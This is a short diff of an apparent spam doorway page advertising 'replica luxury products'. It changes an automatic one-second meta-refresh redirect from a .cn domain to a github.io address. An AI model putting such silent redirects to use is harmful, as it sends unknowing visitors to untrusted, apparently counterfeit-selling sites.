@@ -1,3 +1,3 @@
 <title>Best Replica Luxury Products in the World</title>
-<meta http-equiv="refresh" content="1;url=http://bagbexs.luxv.cn">
+<meta http-equiv="refresh" content="1;url=https://ftq617.github.io/?user=am2021">
 Our Customer Service Team Will Reach you in Seconds...
